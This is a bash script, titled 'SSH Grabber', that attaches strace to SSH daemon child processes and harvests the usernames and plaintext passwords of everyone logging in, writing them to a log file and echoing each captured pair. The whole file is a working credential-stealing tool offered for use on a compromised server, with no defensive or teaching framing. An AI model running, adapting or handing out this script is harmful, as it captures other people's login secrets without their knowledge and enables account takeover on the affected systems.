#!/bin/bash
# SSH Grabber by braindead

# Set the output file path
outfile=ssh-creds.log

# Make sure the SSH daemon is running
sshd=$(ps axo args | grep /sshd | grep -v grep)
if [ -z "$sshd" ]; then
	echo "The SSH server daemon is not running. Please start it."
	exit 1
fi

# Make sure strace is installed
strace=$(which strace)
if [ -z "$strace" ]; then
        echo "Strace cannot be found. Please install it and add its location to the path environment variable."
        exit 1
fi

# Function to extract username and password(s) from strace logs
function parse_creds () {
	local i=0
	while IFS='' read -r line || [[ -n "$line" ]]; do
		if [ "$i" -eq "2" ]; then
			local str=$(echo "$line" | grep -o '".*"' | sed 's/"//g') # get quoted value from the line
			local len=$(echo "$line" | awk 'NF>1{print $NF}') # get the number of total chars
			local off=$((4-len))
			local user=${str:($off)}
		elif [ "$i" -eq "11" ]; then
			local str=$(echo "$line" | grep -o '".*"' | sed 's/"//g') # get quoted value from the line
                        local len=$(echo "$line" | awk 'NF>1{print $NF}') # get the number of total chars
                        local off=$((4-len))
                        local pass=${str:($off)}
			echo "$user:$pass" >>"$outfile"
                        echo "Login attempt from $user:$pass"
		elif [[ "$i" -gt "11" && $(((i-11)%3)) -eq "0" && -z $(echo "$line" | grep "^+++") ]]; then
                        local str=$(echo "$line" | grep -o '".*"' | sed 's/"//g') # get quoted value from the line
                        local len=$(echo "$line" | awk 'NF>1{print $NF}') # get the number of total chars
                        local off=$((4-len))
                        local pass=${str:($off)}
			echo "$user:$pass" >>"$outfile"
                        echo "Login attempt from $user:$pass"
		fi
		let "i++"
	done < "$1"
	rm -f "$1"
}

# Listen for sshd child processes and strace them when they spawn
echo "Listening for SSH connections...press Ctrl-C to exit."
while [ 1 ]; do
	pid=$(ps aux | grep ssh | grep net | awk {' print $2'})
	if [ -n "$pid" ]; then
		strace -q -e write -p "$pid" -o "strace$pid.log" && parse_creds "strace$pid.log"
	fi
done
